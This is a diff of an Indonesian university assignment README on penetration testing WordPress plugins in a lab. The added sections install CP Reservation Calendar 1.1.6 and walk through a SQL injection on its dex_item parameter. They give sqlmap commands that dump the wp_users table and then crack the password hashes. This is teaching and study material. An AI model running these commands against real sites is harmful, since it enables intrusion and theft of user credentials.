@@ -10,10 +10,6 @@ Anggota Kelompok
 - Gian Sebastian A. 5113100132
 - Ronauli Sidabukke 5113100142
 
-### Penjelasan Tugas
-
-Tugas ini adalah 
-
 ## Dasar Teori
 
 **1. OS yang digunakan**
@@ -151,8 +147,73 @@ Kelemahannya adalah parameter [ CP_CALENDAR_ID ] yang tidak divalidasi / *escape
 
 * ##### Plugin CP Reservation Calendar 1.1.6
 
-  1. Lorem Ipsum
-![Image]()
+  1. Di command line/terminal/ SSH komputer webserver, pastikan anda berada di direktori wordpress anda
+
+  ```
+  $ cd {direktori web server}/{nama folder tempat wordpress diinstal}
+
+  $ cd /var/www/html/wordpress
+
+  ```
+
+
+  2. Pindah ke folder plugins dengan masukkan perintah berikut (jika pada Linux)
+
+  ```
+  $ cd wp-content/plugins
+
+  ```
+
+
+  3. Untuk mendownload plugin CP Reservation Calendar versi 1.1.6 (jika install langsung dari halaman WP-Admin maka yang terinstall adalah versi paling baru) , masukkan perintah berikut :
+
+  ```
+  $ wget https://downloads.wordpress.org/plugin/cp-reservation-calendar.1.1.6.zip
+
+  ```
+
+   4. Jika download sudah selesai , *unzip* file tersebut dengan memasukkan perintah berikut :
+
+  ```
+  $ unzip cp-reservation-calendar.1.1.6.zip
+
+  ``` 
+
+  Jika unzip belum terinstall, install dengan masukkan perintah berikut :
+
+   ```
+  # apt-get install unzip
+
+  ``` 
+
+  5. Setelah selesai, login ke dalam wordpress yang telah diinstall. Setelah itu, pada sidebar bagian Plugins, klik di bagian Installed Plugin.
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/1.png)
+
+  6. Klik 'Activate' pada plugin Cp Reservation Calendar.
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/2.png)
+
+  7. Setelah diaktivasi , agar dapat di-injection, maka kita harus memasukkan konten CP Reservation calendar ke dalam wordpress agar dapat diakses. Maka, kita akan membuat post baru berisi konten CP Reservation Calendar.
+
+  Klik sidebar Post , lalu klik Add New.
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/3.png)
+
+  7. Setelah muncul halaman add new Post, klik icon kecil bergambar Kalender di sebelah tombol 'Add Media' untuk menambahkan konten Cp Reservation Calendar
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/4.png)
+
+  Jika sudah , maka akan muncul tulisan berikut di bagian isi Post. Setelah muncul , Klik Publish Post di sebelah kanan.
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/5.png)
+
+
+  8. Jika berhasil, maka akan muncul post kira-kira seperti gambar berikut di halaman Wordpress anda.
+
+  ![Instal Cp-Res](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshow_Instalasi_Plugin_CPRes/6.png)
+
+
 
 * ##### Plugin League Manager 3.9.1.1
 
@@ -219,7 +280,7 @@ Pada tahap ini, kami melakukan uji penetrasi berikut :
 
 1. Plugin Video Player 1.5.16 dengan tools WPScan dan Mitmproxy
 
-2. Plugin X dengan tools Y
+2. Plugin CP Reservation Calendar 1.1.6 dengan tool SQLMap
 
 3. Plugin X dengan tools Y
 
@@ -298,9 +359,55 @@ Pada tahap ini, kami melakukan uji penetrasi berikut :
 ![Skenario WPScan dan Mitmproxy](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInjection_WPScan_VideoPlayer/Screenshot_18.jpg)
 
 
-##### 2. Plugin X dengan tools Y
+##### 2. Plugin CP Reservation Calendar 1.1.6 dengan tool SQLMap
 
-##### 3. Plugin X dengan tools Y
+  Seperti yang dibahas dalam link ([exploit-db](https://www.exploit-db.com/exploits/38187/)) ini, kelemahan terdapat pada link **http://localhost/wordpress/?action=dex_reservations_check_posted_data** , pada file wpcontent/plugins/cp-reservation-calendar/dex_reservations.php
+
+  Pada fungsi *dex_reservations_check_posted_data*, terdapat *malicious code* dimana parameter POST dex_item langsung didefine sebagai variabel tanpa di*escape* atau di*sanitize* terlebih dahulu.
+
+  ![Skenario CPRes dan SQLMap](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInj_CPRes/1.png)
+
+  Dan variabel tersebut langsung dieksekusi dengan SQL Query pada fungsi dex_reservation_get_option()
+
+  ![Skenario CPRes dan SQLMap](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInj_CPRes/2.png)
+
+  Maka dengan SQL Map, kita dapat melakukan SQL Injection dengan parameter berikut :
+
+  url = http://{alamat web wordpress}?action=dex_reservations_check_posted_data
+  parameter yang akan diinjeksi : dex_item
+  data yang dikirimkan : dex_reservations_post=1&dex_item=1 (kedua parameter ini dibutuhkan agar tidak keluar dari fungsi dex_reservations_check_posted_data, karena pengecekan dilakukan jika kedua parameter tersebut kosong)
+
+  1. Maka dengan SQLMap, kita masukkan perintah berikut :
+
+  ```
+  $ sqlmap --url="http://{alamat web wordpress}/?action=dex_reservations_check_posted_data" --data="dex_reservations_post=1&dex_item=1" -p dex_item --level=5 --risk=3
+
+  ```
+
+  2. Tunggu script berjalan. Jika sudah selesai, maka SQLMap akan menginfokan arsitektur yang digunakan oleh server target , seperti gambar berikut :
+
+  ![Skenario CPRes dan SQLMap](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInj_CPRes/4.png)
+
+
+  3. Untuk mempermudah SQLMap dalam menscan, maka kita dapat menambahkan parameter dbms pada injection selanjutnya. Misalkan pada skenario ini, kita ingin mendapatkan data users dalam wordpress tersebut, karena wordpress biasanya menggunakan tabel wp_users untuk menyimpan daftar users, maka kita dapat mencoba meng*inject* dengan perintah berikut :
+
+  ```
+  $ sqlmap --url="http://192.168.56.1:81/wordpress/?action=dex_reservations_check_posted_data" --data="dex_reservations_post=1&dex_item=1" -p dex_item --dbms="MySQL" --level=5 --risk=3 -T wp_users --dump
+
+  ```
+
+  4. Jika berhasil ,Selamat, anda akan mendapatkan data users dengan password yang masih di-enkripsi / di salt. Lalu SQLMap akan 'menanyakan' apakah anda ingin mencoba meng-crack password dengan dictionary yang ada.
+
+  ![Skenario CPRes dan SQLMap](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInj_CPRes/5.png)
+
+  5. Jika anda ingin mengcrack passwordnya , maka anda dapat memasukkan data dictionary file tersebut. Dan jika anda beruntung file dictionary tersebut memuat password yang benar dari users tersebut, akan SQLMap akan menginfokannya seperti berikut :
+
+  ![Skenario CPRes dan SQLMap](https://raw.githubusercontent.com/ronayumik/PKSJ/master/Tugas2/Screenshot_SQLInj_CPRes/6.png)
+
+  Password berada di kolom user_pass dan password yang telah didekripsi terdapat di dalam tanda kurung()
+
+
+##### 3. Plugin X dengan tool Y
 
 
 ## 4. Kesimpulan dan Saran
